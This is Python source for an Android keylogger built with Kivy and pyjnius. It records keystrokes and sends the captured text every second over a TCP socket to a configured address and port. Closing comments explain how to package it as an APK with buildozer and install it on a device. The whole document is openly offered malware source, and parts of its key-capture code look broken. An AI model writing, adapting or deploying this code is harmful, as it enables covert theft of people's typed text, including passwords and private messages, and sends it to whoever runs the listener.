import time
import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
import socket

class KeyloggerApp(App):
    def build(self):
        self.keylogger = Keylogger()
        return self.keylogger

class Keylogger(Label):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.text = ""
        self.input_text = ""
        self.ip_address = "127.0.0.1"
        self.port = 5555
        self.running = False
        # Use the org.renpy.android.PythonActivity class instead of the org.kivy.android.PythonActivity class
        self.activity = autoclass('org.renpy.android.PythonActivity').mActivity
        self.activity.getWindow().setTitle("Keylogger")
        self.activity.bind(on_key_down=self.on_key_down)
        Clock.schedule_interval(self.on_interval, 1)

    def on_key_down(self, window, keycode, scancode, codepoint, modifiers):
        self.input_text += chr(codepoint)

    def on_interval(self, *args):
        if self.input_text != "":
            data = {
                "ip_address": self.ip_address,
                "port": self.port,
                "text": self.input_text
            }

            k = threading.Thread(target=self.send, args=(data,))
            k.start()
            self.input_text = ""

    def send(self, data):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((data["ip_address"], data["port"]))
            s.send(data["text"].encode())
            s.close()
        except Exception as e:
            print(e)


if __name__ == "__main__":
    # Use buildozer to create an APK file that includes pyjnius and kivy in the requirements
    # Install the APK file on an Android device or emulator and run it
    KeyloggerApp().run()
